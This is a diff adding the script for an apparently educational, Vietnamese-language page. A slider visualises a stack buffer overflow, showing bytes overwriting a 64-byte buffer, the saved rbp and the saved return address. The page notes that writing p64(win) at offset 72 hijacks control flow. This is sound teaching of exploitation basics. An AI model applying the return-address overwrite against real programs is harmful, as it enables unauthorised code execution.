+  try{var s=localStorage.getItem("so-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var nrange=document.getElementById("nrange"),nval=document.getElementById("nval"),cells=document.getElementById("cells"),svmsg=document.getElementById("svmsg");
+  // layout: buffer 0x40 (64), saved rbp 8 (64..71), saved RIP 8 (72..79)
+  function render(){
+    var n=parseInt(nrange.value,10); nval.textContent=n;
+    var rows=[
+      {name:"saved RIP (72-79)", start:72, len:8, rip:true},
+      {name:"saved rbp (64-71)", start:64, len:8},
+      {name:"buffer (0-63)", start:0, len:64}
+    ];
+    cells.innerHTML=rows.map(function(r){
+      var filled = n > r.start;
+      var full = n >= r.start + r.len;
+      var cls = r.rip ? (n>r.start?"cell rip hit":"cell rip") : (filled?"cell filled":"cell");
+      var state = n>=r.start+r.len ? "ĐÃ ĐÈ" : (n>r.start ? "đè 1 phần" : "chưa chạm");
+      return '<div class="'+cls+'"><span>'+r.name+'</span><span>'+state+'</span></div>';
+    }).join("");
+    svmsg.innerHTML = n<72 ? "Chưa tới saved RIP — chỉ hỏng buffer/rbp." :
+      (n===72 ? "Vừa chạm saved RIP — byte kế bắt đầu kiểm soát luồng!" :
+      '<b style="color:var(--ok)">✓ Kiểm soát saved RIP!</b> Ghi p64(win) tại offset 72 → ret nhảy win().');
+  }
+  nrange.addEventListener("input",render);render();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
